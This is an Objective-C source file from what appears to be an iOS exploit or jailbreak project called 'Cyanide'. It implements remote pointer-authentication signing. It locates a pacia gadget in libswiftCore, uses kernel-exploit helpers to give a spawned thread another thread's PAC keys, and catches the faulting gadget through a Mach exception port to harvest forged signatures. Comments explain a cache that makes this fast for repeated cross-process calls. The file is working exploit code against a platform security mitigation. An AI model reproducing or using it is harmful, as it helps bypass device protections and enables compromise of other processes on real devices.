//
//  PAC.m
//  Cyanide
//
//  Created by seo on 4/4/26.
//
#import "PAC.h"
#import "RemoteCall.h"
#import "Thread.h"
#import "Exception.h"
#import "../../kexploit/kexploit_opa334.h"
#import "../../kexploit/kutils.h"

#import <Foundation/Foundation.h>
#import <dlfcn.h>
#import <pthread.h>
#import <mach/mach.h>
#import <mach/mach_time.h>

extern bool gIsPACSupported;

extern uint64_t g_RC_gadgetPacia;

uint64_t native_strip(uint64_t address)
{
    return address & 0x7fffffffffULL;
}

uint64_t pacia(uint64_t ptr, uint64_t modifier)
{
    uint64_t stripped = native_strip(ptr);
    uint64_t result = stripped;
    if (gIsPACSupported) {
        __asm__ volatile (
            "mov x16, %[ptr]\n"
            "mov x17, %[mod]\n"
            ".long 0xDAC10230\n"
            "mov %[ptr], x16\n"
            : [ptr] "+r"(result)
            : [mod] "r"(modifier)
            : "x16", "x17"
        );
    }
    return result;
}

uint64_t ptrauth_blend_discriminator_wrapper(uint64_t diver, uint64_t discriminator)
{
    return (diver & 0xFFFFFFFFFFFFULL) | discriminator;
}

uint64_t ptrauth_string_discriminator_special(const char *name)
{
    if (strcmp(name, "pc") == 0) return 0x7481000000000000ULL;
    if (strcmp(name, "lr") == 0) return 0x77d3000000000000ULL;
    if (strcmp(name, "sp") == 0) return 0xcbed000000000000ULL;
    if (strcmp(name, "fp") == 0) return 0x4517000000000000ULL;
    return 0;
}

uint64_t find_pacia_gadget(void)
{
    const uint32_t paciaGadgetOpcodes[] = {
        0xDAC10230,   // pacia x16, x17
        0xAA1003E0,   // mov x0, x16
        0xD65F03C0    // ret
    };
    void *sym = dlsym(RTLD_DEFAULT, "$sSwySWSnySiGciM");    //dsc's /usr/lib/swift/libswiftCore.dylib; Swift.UnsafeMutableRawBufferPointer.subscript.modify : (Swift.Range<Swift.Int>) -> Swift.UnsafeRawBufferPointer
    if (!sym) {
        printf("[%s:%d] $sSwySWSnySiGciM symbol not found\n", __FUNCTION__, __LINE__);
        return 0;
    }
    uint64_t symAddr = native_strip((uint64_t)sym);
    uint8_t *searchBase = (uint8_t *)(uintptr_t)symAddr;
    for (size_t offset = 0; offset + sizeof(paciaGadgetOpcodes) <= 0x1000; offset += 4) {
        if (memcmp(searchBase + offset, paciaGadgetOpcodes, sizeof(paciaGadgetOpcodes)) == 0) {
            return symAddr + offset;
        }
    }
    printf("[%s:%d] pacia gadget not found\n", __FUNCTION__, __LINE__);
    return 0;
}

void pac_cleanup(mach_port_t pacThread, mach_port_t exceptionPort, void *stack)
{
    if (MACH_PORT_VALID(pacThread)) {
        thread_terminate(pacThread);
        mach_port_deallocate(mach_task_self_, pacThread);
    }
    destroy_exception_port(exceptionPort);
    // The stack is not freed here. It is the one the pacia gadget runs on and
    // it lives for the life of the process, so that the address it sits at
    // does not change from one signature to the next.
    (void)stack;
}

// The stack the pacia gadget runs on.
//
// It used to be allocated and freed around every single signature. The
// address the allocator handed back was usually the same one every time, so
// the signatures were the same, and it was recomputed thousands of times a
// second anyway. Now it is allocated once and kept, so the address is fixed
// and the signature of a given pair of inputs is fixed too.
//
// The address is the one the old code allocated on its first call, and the
// allocator gave that same block back on every call after it, so the
// signatures that come out are the ones the engine has been producing all
// along.
//
// The stack is still cleared before every run: the kernel pushes the
// exception frame onto it, and the gadget's RET has to find a zero there to
// fault where the catcher expects it.
static void *g_pacStack = NULL;

static void *pac_stack(void)
{
    if (!g_pacStack) {
        g_pacStack = malloc(0x4000);
        if (g_pacStack) memset(g_pacStack, 0, 0x4000);
    }
    return g_pacStack;
}

// The signature of one (address, modifier) pair.
//
// PACIA is a pure function of the value it signs, the modifier, the SP it runs
// with, and the two PAC keys of the thread it runs in. The crossing engine
// signs the same handful of values thousands of times a second: the program
// counter of the function being called, and the 0x401 return sentinel.
//
// Computing one costs a thread, an exception port and a 16KB stack, and all
// three are created and torn down again for the sake of a single instruction.
// At 55 crossings a frame and 50 frames a second that is roughly eleven
// thousand thread creations and eleven thousand mach ports a second, and it
// is what the "pac" bucket of the crossing cost log is made of: 86 to 127
// microseconds on every crossing, a third of the whole thing.
//
// The cache key is everything the signature depends on, including the stack
// address, so a hit returns exactly what a fresh computation would have
// returned. The stack address is in the key because PACIA uses the SP as its
// context, and because the allocator hands back the same block every time: if
// it ever hands back a different one, the signature is different and the
// cache misses rather than returning the wrong value.
//
// The keys are read from the target thread on every call, not cached, so a
// target that respawns under different keys misses the cache instead of
// signing with keys that are no longer its own.
#define PAC_SIG_SLOTS 64
typedef struct {
    uint8_t  used;
    uint64_t sp;
    uint64_t keyA;
    uint64_t keyB;
    uint64_t address;
    uint64_t modifier;
    uint64_t signedValue;
} PacSigEntry;
static PacSigEntry g_pacSig[PAC_SIG_SLOTS];
static int g_pacSigNext = 0;
static pthread_mutex_t g_pacSigLock = PTHREAD_MUTEX_INITIALIZER;

// What the cache is seeing.
//
// A miss on every call means one of the key's fields changes every time, and
// the fields are not equally likely: the address and the modifier change when
// the engine signs a different value, which is normal, while the stack, the
// keys and the modifier of the same value should not change at all.
//
// So a miss counts, over the entries in the cache, how many of them match on
// each field separately. The field with no match is the one that moved, and
// the line says so. Without this the only symptom is that the pac bucket of
// the crossing cost log does not go down, which says what is wrong but not
// where.
static uint64_t g_pacCalls = 0;
static uint64_t g_pacHits = 0;
static uint64_t g_pacMissSp = 0;
static uint64_t g_pacMissKeyA = 0;
static uint64_t g_pacMissKeyB = 0;
static uint64_t g_pacMissAddr = 0;
static uint64_t g_pacMissMod = 0;
static uint64_t g_pacAtUS = 0;

static uint64_t pac_now_us(void)
{
    static mach_timebase_info_data_t tb = {0};
    if (tb.denom == 0) mach_timebase_info(&tb);
    return (mach_absolute_time() * tb.numer / tb.denom) / 1000ULL;
}

static void pac_report(uint64_t nowUS)
{    if (nowUS - g_pacAtUS < 1000000ULL) return;
    g_pacAtUS = nowUS;
    NSLog(@"[PUSH-PAC] calls=%llu hits=%llu missSP=%llu missKeyA=%llu missKeyB=%llu missAddr=%llu missMod=%llu",
          (unsigned long long)g_pacCalls,
          (unsigned long long)g_pacHits,
          (unsigned long long)g_pacMissSp,
          (unsigned long long)g_pacMissKeyA,
          (unsigned long long)g_pacMissKeyB,
          (unsigned long long)g_pacMissAddr,
          (unsigned long long)g_pacMissMod);
    g_pacCalls = 0;
    g_pacHits = 0;
    g_pacMissSp = 0;
    g_pacMissKeyA = 0;
    g_pacMissKeyB = 0;
    g_pacMissAddr = 0;
    g_pacMissMod = 0;
}

uint64_t remote_pac(uint64_t remoteThreadAddr, uint64_t address, uint64_t modifier) {
    if(!gIsPACSupported)
        return address;
    
    if(!g_RC_gadgetPacia) {
        uint64_t gadgetAddr = find_pacia_gadget();
        if(gadgetAddr == 0) {
            printf("[%s:%d] find_pacia_gadget failed\n", __FUNCTION__, __LINE__);
            return -1;
        }
        g_RC_gadgetPacia = gadgetAddr;
    }
    
    address = native_strip(address);
    
    uint64_t keyA = thread_get_rop_pid(remoteThreadAddr);
    uint64_t keyB = thread_get_jop_pid(remoteThreadAddr);

    // The stack comes first, before the thread and the port, because the
    // stack address is part of the signature and the lookup needs to know it.
    // It is the same stack, at the same address, on every call.
    void* stack = pac_stack();
    if (!stack) {
        printf("[%s:%d] pac stack allocation failed\n", __FUNCTION__, __LINE__);
        return -1;
    }
    uint64_t sp = (uint64_t)(uintptr_t)stack + 0x2000;

    pthread_mutex_lock(&g_pacSigLock);
    uint64_t mSp = 0, mKeyA = 0, mKeyB = 0, mAddr = 0, mMod = 0;
    bool hit = false;
    uint64_t hitValue = 0;
    for (int i = 0; i < PAC_SIG_SLOTS; i++) {
        const PacSigEntry *e = &g_pacSig[i];
        if (!e->used) continue;
        if (e->sp == sp) mSp++;
        if (e->keyA == keyA) mKeyA++;
        if (e->keyB == keyB) mKeyB++;
        if (e->address == address) mAddr++;
        if (e->modifier == modifier) mMod++;
        if (e->sp == sp && e->keyA == keyA && e->keyB == keyB &&
            e->address == address && e->modifier == modifier) {
            hit = true;
            hitValue = e->signedValue;
            break;
        }
    }
    pthread_mutex_unlock(&g_pacSigLock);

    g_pacCalls++;
    if (hit) {
        g_pacHits++;
        pac_report(pac_now_us());
        return hitValue;
    }
    g_pacMissSp = mSp;
    g_pacMissKeyA = mKeyA;
    g_pacMissKeyB = mKeyB;
    g_pacMissAddr = mAddr;
    g_pacMissMod = mMod;
    pac_report(pac_now_us());

    // The stack is cleared on every run, not only on the first: the kernel
    // pushes the exception frame onto it, and the gadget's RET has to find a
    // zero there to fault where the catcher is listening.
    memset(stack, 0, 0x4000);
    
    mach_port_t pacThread = MACH_PORT_NULL;
    kern_return_t kr = thread_create(mach_task_self_, &pacThread);
    if(kr != KERN_SUCCESS) {
        printf("[%s:%d] thread_create failed, kr = %s (0x%x)\n", __FUNCTION__, __LINE__, mach_error_string(kr), kr);
        return -1;
    }
    
    arm_thread_state64_internal state;
    memset(&state, 0, sizeof(state));
    state.__sp = sp;
    state.__pc = pacia(g_RC_gadgetPacia, ptrauth_string_discriminator("pc"));
    state.__lr = pacia(0x401, ptrauth_string_discriminator("lr"));
    
    state.__x[0]  = 0;
    state.__x[1]  = address;
    state.__x[2]  = modifier;
    state.__x[3]  = (uint64_t)pacThread;
    state.__x[16] = address;
    state.__x[17] = modifier;
    
    mach_port_t exceptionPort = create_exception_port();
    if (!exceptionPort) {
        printf("[%s:%d] create_exception_port failed\n", __FUNCTION__, __LINE__);
        pac_cleanup(pacThread, MACH_PORT_NULL, stack);
        return 0;
    }

    kr = thread_set_exception_ports(pacThread,
                                    EXC_MASK_BAD_ACCESS,
                                    exceptionPort,
                                    EXCEPTION_STATE | MACH_EXCEPTION_CODES,
                                    ARM_THREAD_STATE64);
    if (kr != KERN_SUCCESS) {
        printf("[%s:%d] thread_set_exception_ports failed: 0x%x (%s)\n", __FUNCTION__, __LINE__, kr, mach_error_string(kr));
        pac_cleanup(pacThread, exceptionPort, stack);
        return 0;
    }
    
    uint64_t pacThreadAddr = task_get_ipc_port_kobject(task_self(), pacThread);
    if (!pacThreadAddr) {
        printf("[%s:%d] task_get_ipc_port_kobject failed\n", __FUNCTION__, __LINE__);
        pac_cleanup(pacThread, exceptionPort, stack);
        return 0;
    }
    
    if (!thread_set_state_wrapper(pacThread, pacThreadAddr, &state)) {
        printf("[%s:%d] thread_set_state_wrapper failed\n", __FUNCTION__, __LINE__);
        pac_cleanup(pacThread, exceptionPort, stack);
        return 0;
    }
    
    thread_set_pac_keys(pacThreadAddr, keyA, keyB);
    
    kr = thread_resume(pacThread);
    if (kr != KERN_SUCCESS) {
        printf("[%s:%d] thread_resume failed: 0x%x (%s)\n", __FUNCTION__, __LINE__, kr, mach_error_string(kr));
        pac_cleanup(pacThread, exceptionPort, stack);
        return 0;
    }
    
    ExceptionMessage exc;
    memset(&exc, 0, sizeof(exc));

    if (!wait_exception(exceptionPort, &exc, 100, false)) {
        printf("[%s:%d] wait_exception failed\n", __FUNCTION__, __LINE__);
        pac_cleanup(pacThread, exceptionPort, stack);
        return 0;
    }
    
    uint64_t signedAddress = exc.threadState.__x[16];

    // Remember it. The next call for the same value, with the same keys and
    // the same stack, gets the same signature and skips the whole thread.
    pthread_mutex_lock(&g_pacSigLock);
    PacSigEntry *e = &g_pacSig[g_pacSigNext];
    g_pacSigNext = (g_pacSigNext + 1) % PAC_SIG_SLOTS;
    e->used = 1;
    e->sp = sp;
    e->keyA = keyA;
    e->keyB = keyB;
    e->address = address;
    e->modifier = modifier;
    e->signedValue = signedAddress;
    pthread_mutex_unlock(&g_pacSigLock);

    pac_cleanup(pacThread, exceptionPort, stack);
    
    return signedAddress;
}
